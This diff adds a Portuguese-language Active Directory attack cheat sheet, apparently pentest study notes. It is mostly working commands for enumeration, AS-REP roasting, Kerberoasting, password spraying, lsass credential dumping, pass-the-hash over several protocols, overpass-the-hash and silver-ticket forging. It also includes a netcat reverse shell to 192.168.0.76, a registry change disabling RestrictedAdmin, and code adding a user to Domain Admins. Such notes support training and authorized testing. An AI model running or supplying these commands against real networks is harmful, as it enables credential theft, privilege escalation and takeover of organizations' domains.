@@ -1,0 +1,367 @@
+Active Directory
+========================
+
+Aqui já podemos levar em conta que já temos uma credencial válida de domínio e, até podemos ter acesso a máquina, mas se não houver, podemos começar conforme os passos abaixo:
+
+- [ ] [**Enumeração do domínio com bloodhound**](#enumeracao-do-dominio-com-bloodhound)
+- [ ] [**Enumeração manual do domínio**](#enumeracao-manual)
+    - [ ] [Enumerar usuários privilegiados](#enumerar-usuarios-privilegiados)
+- [ ] [**AsRep Roasting**](#asrep-roasting) impacket ou Rubeus
+- [ ] [**Password Spray**](#password-spray)
+- [ ] [**Enumerar contas de serviço**](#enumerar-contas-de-servico)
+- [ ] [**Kerberoasting**](#kerberoasting): impacket ou Rubeus
+- [ ] [**Dump de hashes**](#lsass-dump)
+- [ ] [**Pass the Hash**](#pass-the-hash)
+- [ ] [**Over Pass the Hash**](#over-pass-the-hash)
+- [ ] [**Silver Ticket**](#silver-ticket)
+
+
+## Enumeração do domínio com Bloodhound
+
+Opção remota com bloodhound-python
+
+```
+bloodhound-python -u <usuario> -p <senha> -d <dominio.local> -v --zip -c All -dc <hostname_dc> -ns <ip_dns>
+```
+
+Opção local com SharpHound, sendo SharpHound.exe = sh.exe
+```
+    ./sh.exe -c all -d dominio.local --ldapuser <usuario> --ldappassword <senha>
+```
+Vale ressaltar que existe a possibilidade de executar esse comando de outras formas também e a maneira mais simples de fazâ-lo seria:
+
+```
+    ./sh.exe -c all
+```
+
+Cuidado com esses comandos em ambiente corporativo. Faz muito barulho!!!
+</details>
+
+<details markdown="1"><summary markdown="1">
+
+Com essa sessão não é tão utilizada, optei por minimizar esse conteúdo
+
+## Enumeracao Manual
+</summary>
+
+**oneliner(users)**
+
+```
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Searcher.FindAll()
+```
+
+**users detailed information**
+
+```
+ $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Result = $Searcher.FindAll(); Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}Write-Host "------------------------"}
+```
+
+**oneliner (grupos)**
+
+```
+ $ldapFilter = "(objectClass=Group)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties.name}
+```
+
+**oneliner (sub grupos)**
+
+```
+ $ldapFilter = "(name=LAPS_Readers)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties}
+```
+
+**Group members**
+
+```
+ $ldap_filter = "(name=LAPS_Readers)"; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter=$ldap_filter;$Result = $Searcher.FindAll(); Foreach($obj in $Result) {$obj.Properties.member}
+```
+
+**Service Principal Names**
+
+```
+ $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="serviceprincipalname=*";$Result = $Searcher.FindAll();Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}}
+ 
+```
+
+### Enumerar usuários privilegiados
+
+```
+    $ldapFilter = "(&(objectclass=user)(memberof=CN=Domain Admins,CN=Users,DC=xor,DC=com))"
+    $domain = New-Object System.DirectoryServices.DirectoryEntry
+    $search = New-Object System.DirectoryServices.DirectorySearcher
+    $search.SearchRoot = $domain
+    $search.PageSize = 1000
+    $search.Filter = $ldapFilter
+    $search.SearchScope = "Subtree"
+    #Execute Search
+    $results = $search.FindAll()
+    Foreach($obj in $results) {
+      Foreach($prop in $obj.Properties){ 
+          $prop
+        }
+    }
+```
+
+onde DC (no filtro, primeira linha do script) ali vai ser o nome do domínio que estamos analisando.
+</details>
+
+## AsRep Roasting
+
+Com impacket
+
+    impacket-GetNPUsers -usersfile usernames.txt -dc-host <hostname_dc> <dominio>
+
+ou com Rubeus
+
+    ./r.exe asreproast /domain:<dominio> /dc:<hostname_dc>
+
+Depois, para quebrar o(s) hash(s):
+
+    john --format=krb5asrep -w /usr/share/wordlists/rockyou.txt hashes_temp.txt
+
+## Password spray
+
+```
+crackmapexec ldap hosts.txt -u users.txt -p P@ssword! --continue
+
+crackmapexec smb 10.10.11.152 -u users.txt -p passwords_test.txt --continue
+
+crackmapexec winrm 10.10.11.152 -u users.txt -p passwords_test.txt --continue
+```
+
+
+## Enumerar contas de serviço
+
+```
+    setspn -F -Q */*
+```
+
+```
+$ldapFilter = "(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))"
+$domain = New-Object System.DirectoryServices.DirectoryEntry
+$search = New-Object System.DirectoryServices.DirectorySearcher
+$search.SearchRoot = $domain
+$search.PageSize = 1000
+$search.Filter = $ldapFilter
+$search.SearchScope = "Subtree"
+#Execute Search
+$results = $search.FindAll()
+#Display SPN values from the returned objects
+foreach ($result in $results)
+{
+    $userEntry = $result.GetDirectoryEntry()
+    Write-Host "User Name = " $userEntry.name
+    foreach ($SPN in $userEntry.servicePrincipalName)
+        {
+            Write-Host "SPN = " $SPN      
+        }
+    Write-Host ""   
+}
+```
+
+## Kerberoasting
+
+Se atentar a este ponto, visto que enumerando localmente na máquina, são retornados vários SPNs pré configurados do próprio domínio. Temos que enumerar os que estão associados a uma conta de serviço (user), pois a probabilidade de ter uma senha fraca é maior.
+
+Impacket
+
+    impacket-GetUsersSPNs -request -dc-host <hostname_dc> <dominio/user:senha>
+
+Rubeus
+
+Rubeus.exe=r.exe
+
+    ./r.exe kerberoast /domain:<domain.local> /dc:<hostname_dc>
+
+ou
+
+    ./r.exe kerberoast /outfile:kerberoastables.txt /domain:<dominio.local> /dc:<hostname_dc>
+    hashcat -m 13100 -a 0 ticket.kirbi /usr/share/wordlists/rockyou.txt
+
+Mimikatz
+
+mimikatz.exe=m.exe
+
+Verificando os tickets existentes na máquina
+
+```
+./m.exe
+privilege::debug
+sekurlsa::tickets
+```
+Requisitando os tickets na máquina:
+
+```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList
+'HTTP/dominio.serv.com'
+
+klist
+```
+Pode ser que o comando não funcione pelo fato de a credencial não ter sido enviada pela rede, então temos de fazer o seguinte:
+```
+$pass = ConvertTo-SecureString '<senha>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('<dominio\usuario>',$pass)
+get-domainspnticket -spn IMAP/EXCH01.htb.local -credential $cred
+```
+Depois de verificado por meio do klist que os tickets estão importados na memória, devemos utilizar o mimikatz para exportar eles:
+
+```
+./m.exe
+privilege::debug
+kerbertos::list /export
+```
+E para quebrar os hashes de senha, temos de fazer o seguinte:
+
+```
+python kirbi2john.py /path/file.kirbi > kirbi.john
+john --wordlist=/usr/share/rockyou.txt kirbi.john
+```
+ou
+
+    python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~dominio.com-dominio.com.kirbi
+
+
+## lsass dump
+
+Esse ponto é importante, porque nos dará condições de fazer o ataque de pass-the-hash! O objetivo aqui é obter os hashes de senha dos usuários e informar esses hashes por meio dos comandos para conseguir se autenticar com um determinado procotolo, por exemplo. As possibilidades de extração de hashes são os seguintes...
+
+mimikatz
+
+    privilege::debug
+    sekurlsa::logonPasswords
+    lsadump::lsa /patch
+
+procdump
+
+    get-process lsass
+    .\procdump -accepteula -ma 572 out.dmp
+    #ou
+    .\pd.exe -accepteula -ma lsass.exe lsass_dump
+    #Then parse it with mimikatz
+    mimikatz.exe
+    sekurlsa::minidump out.dmp
+    sekurlsa::logonpasswords
+    #remotelly
+    pypykatz lsa minidump lsass_dump.dmp
+
+TaskManager
+
+![qownnotes-media-jjlIpZ](../../../media/qownnotes-media-jjlIpZ.png)
+
+Crackmapexec
+
+    crackmapexec smb 192.168.175.202 -u Administrator -H "<nt_hash>" --lsa
+
+## Pass the hash
+
+
+Localmente
+
+Mimikatz
+
+    sekurlsa::pth /user:user1 /domain:home.lab /ntlm:ae974876d974abd805a989ebead86846 /run:".\n.exe -e cmd 192.168.0.76 8089"
+
+Remotamente
+
+#### winrm
+
+```
+evil-winrm -i 10.10.10.103 -u Administrator -H f6b7160bfc91823792e0ac3a162c9267
+```
+
+#### RDP
+
+    cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+    xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
+
+
+#### LDAP
+
+python
+
+    python3
+    >>> import ldap3
+    >>> user = 'DOMAIN\\EXCHANGE$'
+    >>> password = 'aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248'
+    >>> server = ldap3.Server('DOMAIN.LOCAL')
+    from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM
+    connection = ldap3.Connection(server, user=user, password=password, authentication=NTLM)
+    >>> connection.bind()
+    >>> from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups as addUsersInGroups
+    >>> user_dn = 'CN=IT User,OU=Standard Accounts,DC=domain,DC=local'
+    >>> group_dn = 'CN=Domain Admins,CN=Users,DC=domain,DC=local'
+    >>> addUsersInGroups(connection, user_dn, group_dn)
+    True
+
+crackmapexec
+
+    crackmapexec ldap 192.168.175.202 -u usuarios.txt -H "<nt_hash>"
+
+#### WMI
+
+    wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
+
+#### SMB
+
+    smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
+
+    impacket-psexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
+    impacket-smbexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
+
+Crackmapexec
+
+    crackmapexec smb 192.168.175.202 -u Administrator -H "<nt_hash>" --lsa
+
+  
+## Over pass the hash
+
+O objetivo aqui é para obter um ticket Kerberos, pois caso utilizamos algum recurso que não suporte o NTLM como autenticação, temos a opção de utilizar o ticket kerberos como autenticação.
+
+Para fazer esse tipo de ataque de maneira remota, pordemos utilizar o impacket:
+
+Primeiro requisitamos o TGT:
+
+    impacket-getTGT -dc-ip <IP_do_DC> domain/user:password
+
+ou
+
+    impacket-getTGT -dc-ip <ip_dc> <domain/usuario> -hashes :<nt_hash>
+
+Aqui teremos de [fazer a conversão da senha para o hash NT](#conversa-de-senha-em-texto-claro-para-nt-hash)
+
+Aqui já teremos o .ccache e podemos carregar essa informação no Kali Linux da seguinte maneira:
+
+    export KRB5NAME=/home/acosta/owncloud/Area_de_trabalho/estudos/hack_the_box/scrambled/Administrator.ccache
+
+## Conversão de senha em texto claro para hash NT
+
+    iconv -f ASCII -t UTF-16LE &#x3C;(printf "<senha>") | openssl dgst -md4
+
+ou
+
+    python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "<senha>".encode("utf-16le")).digest()))'
+
+
+Para conduzir esse ataque, primeiro temos que injetar na memória do nosso processo a credencial do nosso usuário administrativo, por exemplo:
+
+    sekurlsa::pth /user:user1 /domain:home.lab /ntlm:ae974876d974abd805a989ebead86846 /run:".\n.exe -e cmd 192.168.0.76 8089"
+
+Depois disso, temos de fazer uma requisição de rede de algum serviço para carregar o ticket kerberos na memória
+
+    net use \\dc01.home.lab
+
+**Fica como observação que não consegui reproduzir isso no laboratório**
+
+## Silver Ticket
+
+Impacket
+
+    impacket-ticketer -spn 'MSSQLSvc/dc1.scrm.local:1433' -domain domain.name -domain-sid <domain_sid> -nthash <ntlm_da_senha_do_spn> -dc-ip <hostname_dc> adm
+
+
+Mimikatz
+
+Esse tipo de ataque é interessante para fazer lateralização, dado que vários servidores podem ter a mesma conta de serviço.
+
+
+    ./m.exe
+    kerberos::golden /user:<usuario> /domain:corp.com /sid:<sid_do_dominio> /target:<dominio.local> /service:HTTP /rc4:<nthash> /ptt
